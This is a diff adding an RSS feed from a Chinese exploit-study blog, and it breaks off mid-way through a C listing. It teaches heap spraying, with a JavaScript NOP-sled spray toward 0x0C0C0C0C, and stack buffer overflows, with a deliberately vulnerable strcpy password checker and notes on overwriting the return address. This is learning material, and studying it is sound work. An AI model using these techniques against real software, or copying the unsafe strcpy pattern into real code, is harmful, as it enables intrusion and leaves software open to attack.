@@ -1,0 +1,586 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>栈溢出 on Misaka的秘密花园</title><link>https://blog.moeomu.com/zh-cn/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/</link><description>Recent content in 栈溢出 on Misaka的秘密花园</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Sun, 25 Oct 2020 17:56:00 +0800</lastBuildDate><atom:link href="https://blog.moeomu.com/zh-cn/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/index.xml" rel="self" type="application/rss+xml"/><item><title>漏洞利用学习笔记-010-HeapSpray</title><link>https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-010-heapspray/</link><pubDate>Sun, 25 Oct 2020 17:56:00 +0800</pubDate><guid>https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-010-heapspray/</guid><description>&lt;p>声明：实验环境为 Windows 2000&lt;/p>
+&lt;p>本文来源：&lt;a class="link" href="https://blog.moeomu.com/zh-cn/posts/%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8%e5%ad%a6%e4%b9%a0%e7%ac%94%e8%ae%b0-010-heapspray/" >Moeomu的博客&lt;/a>&lt;/p>
+&lt;h2 id="简介">简介&lt;/h2>
+&lt;blockquote>
+&lt;p>针对浏览器的攻击中，常常会结合使用堆和栈协同利用漏洞&lt;/p>
+&lt;/blockquote>
+&lt;ul>
+&lt;li>当浏览器或其使用的ActiceX控件中存在溢出漏洞时，攻击者就可以生成一个特殊的HTML文件来触发这个漏洞&lt;/li>
+&lt;li>不管是堆溢出还是栈溢出，漏洞触发后最终能够获得EIP&lt;/li>
+&lt;li>有时我们可能很难在浏览器中复杂的内存环境下不知完整的shellcode&lt;/li>
+&lt;li>页面中的JavaScript可以申请堆内存，因此shellcode通过JavaScript布置在堆中称为可能&lt;/li>
+&lt;li>shellcode放在堆中如何定位：HeapSpray&lt;/li>
+&lt;/ul>
+&lt;h2 id="技术细节">技术细节&lt;/h2>
+&lt;ul>
+&lt;li>在使用Heap Spray的时候，一般将EIP指向堆区&lt;code>0x0C0C0C0C&lt;/code>位置，然后用JavaScript申请使用大量堆内存并用包含着&lt;code>0x9&lt;/code>0和shellcode的内存片覆盖这些内存&lt;/li>
+&lt;li>通常，JS会从低地址向高地址分配内存，因此申请的内存超过200MB的话，0x0C0C0C0C将被含有shellcode的内存片覆盖，只要内存片中的0x90能够命中0x0C0C0C0C，shellcode就可以执行&lt;/li>
+&lt;/ul>
+&lt;h2 id="js代码">JS代码&lt;/h2>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-JavaScript" data-lang="JavaScript">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">var&lt;/span> &lt;span class="nx">nop&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">unescape&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;%u9090%u9090&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">while&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">nop&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">length&lt;/span> &lt;span class="o">&amp;lt;=&lt;/span> &lt;span class="mh">0x100000&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">nop&lt;/span>&lt;span class="o">+=&lt;/span>&lt;span class="nx">nop&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>&lt;span class="c1">//生成一个 1MB 大小充满 0x90 的数据块
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">nop&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">nop&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">substring&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x100000&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">2&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">32&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">2&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">2&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="nx">shellcode&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">length&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">var&lt;/span> &lt;span class="nx">slide&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nx">Arrary&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">200&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">slide&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">nop&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nx">shellcode&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>解释
+&lt;ul>
+&lt;li>每个内存片大小为1MB&lt;/li>
+&lt;li>首先产生一个大小为1MB而且全部被0x90填满的内存块&lt;/li>
+&lt;li>由于Java会为申请到的内存填上一些额外的信息，为了保证内存片是1MB，要将这些空间减去&lt;/li>
+&lt;li>我们使用200个这样的内存片来覆盖堆内存，只要任意一篇nop区可以覆盖0x0C0C0C0C，就可以成功&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;blockquote>
+&lt;p>额外空间&lt;/p>
+&lt;/blockquote>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>&lt;/th>
+&lt;th>size&lt;/th>
+&lt;th>说明&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>malloc header&lt;/td>
+&lt;td>32 byte&lt;/td>
+&lt;td>堆块信息&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>string length&lt;/td>
+&lt;td>4 byte&lt;/td>
+&lt;td>表示字符串长度&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>terminator 2&lt;/td>
+&lt;td>1 byte&lt;/td>
+&lt;td>堆块信息&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;h2 id="实践">实践&lt;/h2>
+&lt;ul>
+&lt;li>未完待续&lt;/li>
+&lt;/ul></description></item><item><title>漏洞利用学习笔记-001-缓冲区溢出</title><link>https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-001-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/</link><pubDate>Sun, 18 Oct 2020 10:00:00 +0800</pubDate><guid>https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-001-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/</guid><description>&lt;blockquote>
+&lt;ul>
+&lt;li>功能性逻辑缺陷(Bug)&lt;/li>
+&lt;li>安全性逻辑缺陷(Vulnerability)&lt;/li>
+&lt;/ul>
+&lt;p>&lt;a class="link" href="exploit-study-01.zip" >点击此处下载本文附代码，可执行程序，shellcode文件&lt;/a>&lt;/p>
+&lt;/blockquote>
+&lt;p>本文来源：&lt;a class="link" href="https://blog.moeomu.com/zh-cn/posts/%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8%e5%ad%a6%e4%b9%a0%e7%ac%94%e8%ae%b0-001-%e7%bc%93%e5%86%b2%e5%8c%ba%e6%ba%a2%e5%87%ba/" >Moeomu的博客&lt;/a>&lt;/p>
+&lt;h2 id="pe概念">PE概念&lt;/h2>
+&lt;h3 id="pe文件与虚拟内存之间的映射">PE文件与虚拟内存之间的映射&lt;/h3>
+&lt;ul>
+&lt;li>ImageBase：装载基址，对(.EXE)是0x00400000，对(.DLL)是0x10000000&lt;/li>
+&lt;li>FileOffset：文件偏移地址&lt;/li>
+&lt;li>VirtualAddress：虚拟地址，是映射到内存中的地址&lt;/li>
+&lt;li>RelativeVirtualAddress：相对虚拟地址，是虚拟地址VA相对装载基址的偏移量&lt;/li>
+&lt;/ul>
+&lt;blockquote>
+&lt;p>VA = ImageBase + RVA&lt;/p>
+&lt;/blockquote>
+&lt;h3 id="数据补全填充规则">数据补全填充规则&lt;/h3>
+&lt;ul>
+&lt;li>在磁盘上时，PE文件的每个节(.section)是以0x200字节为单位存放，当节的大小不足0x200时，使用0x0补全，当节的大小超过0x200时，分配下一个0x200大小给此节&lt;/li>
+&lt;li>在内存中时，PE文件的每个节(.section)是以0x1000字节为单位存放，规则同上&lt;/li>
+&lt;/ul>
+&lt;blockquote>
+&lt;p>SectionOffset = RVA - FileOffset&lt;br>
+FileOffset = VA - ImageBase - SectionOffset = RVA - SectionOffset&lt;/p>
+&lt;p>例如.text节RVA=0x1000，FileOffset=0x400，则SectionOffset=0xC00&lt;br>
+0x00404141处指令文件偏移为0x00404141-0x00400000-(0x1000-0x400)=0x3541&lt;/p>
+&lt;/blockquote>
+&lt;h3 id="函数调用约定">函数调用约定&lt;/h3>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>&lt;/th>
+&lt;th>C&lt;/th>
+&lt;th>SysCall&lt;/th>
+&lt;th>StdCall&lt;/th>
+&lt;th>BASIC&lt;/th>
+&lt;th>FORTRAN&lt;/th>
+&lt;th>PASCAL&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>参数入栈顺序&lt;/td>
+&lt;td>右-&amp;gt;左&lt;/td>
+&lt;td>右-&amp;gt;左&lt;/td>
+&lt;td>右-&amp;gt;左&lt;/td>
+&lt;td>左-&amp;gt;右&lt;/td>
+&lt;td>左-&amp;gt;右&lt;/td>
+&lt;td>左-&amp;gt;右&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>恢复栈平衡的位置&lt;/td>
+&lt;td>母函数&lt;/td>
+&lt;td>子函数&lt;/td>
+&lt;td>子函数&lt;/td>
+&lt;td>子函数&lt;/td>
+&lt;td>子函数&lt;/td>
+&lt;td>子函数&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;h3 id="缓冲区溢出">缓冲区溢出&lt;/h3>
+&lt;blockquote>
+&lt;p>栈帧相邻，局部变量相邻，若数组越界，则会覆盖局部变量，接着覆盖函数返回地址&lt;br>
+通过淹没栈帧返回地址值以控制程序流程&lt;/p>
+&lt;/blockquote>
+&lt;hr>
+&lt;h2 id="shellcode">ShellCode&lt;/h2>
+&lt;h3 id="exploitshellcodepayload的分工合作">Exploit/ShellCode(Payload)的分工合作&lt;/h3>
+&lt;ul>
+&lt;li>Exploit的作用是精准利用某种漏洞，目标是劫持EIP&lt;/li>
+&lt;li>ShellCode将执行恶意/善意代码，是攻击载荷&lt;/li>
+&lt;li>ShellCode一般是通用的，Exploit只能针对某个特定的漏洞工作&lt;/li>
+&lt;/ul>
+&lt;h3 id="实例">实例&lt;/h3>
+&lt;p>本例使用简单的密码验证来测试漏洞&lt;/p>
+&lt;hr>
+&lt;h4 id="缓冲区溢出控制程序flag">缓冲区溢出控制程序Flag&lt;/h4>
+&lt;h5 id="代码expstd0101">代码(ExpStd0101)&lt;/h5>
+&lt;blockquote>
+&lt;p>编译环境：Windows XP SP3, Visual C++ 6, Debug&lt;br>
+实验环境：Windows XP SP3&lt;/p>
+&lt;/blockquote>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#define PASSWORD &amp;#34;1234567&amp;#34;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">verify_password&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">password&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">authenticated&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">buffer&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">authenticated&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">strcmp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">password&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PASSWORD&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">strcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buffer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">password&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">authenticated&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">valid_flag&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">password&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1024&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">while&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Input Number:&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">scanf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;%s&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">password&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">valid_flag&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">verify_password&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">password&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">valid_flag&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;ERROR!&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;OK!&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h5 id="分析expstd0101">分析(ExpStd0101)&lt;/h5>
+&lt;ul>
+&lt;li>
+&lt;p>简易分析&lt;/p>
+&lt;ul>
+&lt;li>当输入99999999时，它的末尾&lt;code>'\0'&lt;/code>将第9个字节填充，正好将authenticated的最低位1个字节0x1改为0x0&lt;/li>
+&lt;li>这也和strcmp函数有关系，如果&lt;code>str1&amp;lt;str2&lt;/code>那authenticated的值-1以反码&lt;code>FFFFFFFF&lt;/code>存储，此时即使将低位&lt;code>FF&lt;/code>溢出为&lt;code>00&lt;/code>也无用，所以并非全部的8位字符都可以绕过验证&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>进一步验证&lt;/p>
+&lt;ul>
+&lt;li>当输入8个9时，8字节的buffer填满，覆盖1字节的authenticated空间&lt;/li>
+&lt;li>当输入11个9时，8字节的buffer填满，覆盖4字节的authenticated空间，即authenticated被完全覆盖，它被冲刷为&lt;code>0x0039393939&lt;/code>&lt;/li>
+&lt;li>当输入15个9时，8字节的buffer填满，覆盖4字节的authenticated空间，本函数EBP所在空间也被覆盖(内容是父函数EBP)&lt;/li>
+&lt;li>当输入19个9时，8字节的buffer填满，覆盖4字节的authenticated空间，覆盖4字节的EBP空间，覆盖4字节的返回地址&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>更进一步验证&lt;/p>
+&lt;ul>
+&lt;li>由于键盘无法输入一些不可见字符，所以更换为读取文件验证&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h4 id="硬编码地址控制程序流程">硬编码地址控制程序流程&lt;/h4>
+&lt;p>使用FILE来进行文件的读取&lt;/p>
+&lt;h5 id="代码expstd0102">代码(ExpStd0102)&lt;/h5>
+&lt;blockquote>
+&lt;p>编译环境：Windows XP SP3, Visual C++ 6, Debug&lt;br>
+实验环境：Windows XP SP3&lt;/p>
+&lt;/blockquote>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#define PASSWORD &amp;#34;1234567&amp;#34;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">verify_password&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">password&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">authenticated&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">buffer&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">authenticated&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">strcmp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">password&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PASSWORD&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">strcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buffer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">password&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">authenticated&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">valid_flag&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">password&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1024&lt;/span>&lt;span class="p">];&lt;/span>
